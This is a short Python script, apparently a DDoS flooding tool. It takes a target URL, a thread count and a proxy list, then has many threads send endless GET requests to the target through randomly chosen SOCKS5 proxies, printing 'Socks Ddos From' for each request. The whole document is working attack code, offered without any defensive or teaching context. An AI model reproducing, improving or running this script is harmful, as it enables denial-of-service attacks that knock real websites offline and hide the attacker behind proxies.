import requests
import sys
import random
from threading import Thread

url = str(sys.argv[1])
thr = int(sys.argv[2])
list = str(sys.argv[3])
s = requests.session()
def atk():
	while True:
		pprr = open(list).readlines()
		proxy = random.choice(pprr).strip().split(":")
		s.proxies = {}
		s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
		s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
		try:
			s.get(url)
			print("Socks Ddos From ~ / " + str(proxy[0])+":"+str(proxy[1]))
		except:
			s.close()
			print("Socks Down !")

for x in range(thr):
	x = Thread(target=atk, name=(x))
	x.start()
